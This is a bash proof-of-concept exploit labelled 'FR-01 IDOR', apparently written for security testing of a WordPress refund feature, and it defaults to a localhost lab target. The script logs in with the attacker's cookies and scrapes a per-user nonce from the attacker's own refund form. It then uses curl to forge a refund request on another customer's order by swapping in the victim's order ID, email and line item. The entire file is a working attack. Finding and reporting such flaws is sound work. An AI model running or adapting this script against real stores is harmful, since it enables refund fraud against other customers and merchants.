#!/usr/bin/env bash
# FR-01 IDOR — authenticated customer forges a refund request on another customer's order.
# Fill TARGET and the attacker's own WordPress cookies; set the victim values.
set -euo pipefail
TARGET=${TARGET:-http://localhost:8088}
COOKIES=${COOKIES:-attacker.cookies}     # attacker's logged-in WP cookie jar
OWN_ORDER=${OWN_ORDER:-11}               # an order the attacker owns (to mint the nonce)
VICTIM_ORDER=${VICTIM_ORDER:-12}         # target order (not owned by attacker)
VICTIM_EMAIL=${VICTIM_EMAIL:-victim@lab.test}
VICTIM_ITEM=${VICTIM_ITEM:-2}            # a line-item id of the victim order (small int)

# 1) nonce is per-USER (not per-order) — read it from the attacker's own refund form
NONCE=$(curl -s -b "$COOKIES" "$TARGET/my-account/fr-refund/$OWN_ORDER/?form_id=1" \
  | grep -oE 'fr_refund_request\]" value="[a-f0-9]+"' | grep -oE '[a-f0-9]+"$' | tr -d '"')
echo "nonce=$NONCE"

# 2) forge the request against the victim's order
curl -s -b "$COOKIES" -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' \
  "$TARGET/?send_public_refund=1&refund_order_id=$VICTIM_ORDER&refund_email=$VICTIM_EMAIL" \
  --data-urlencode "fr_refund_form[items][$VICTIM_ITEM][qty]=1" \
  --data-urlencode "fr_refund_form[form_id]=1" \
  --data-urlencode "fr_refund_form[fr_refund_request]=$NONCE"
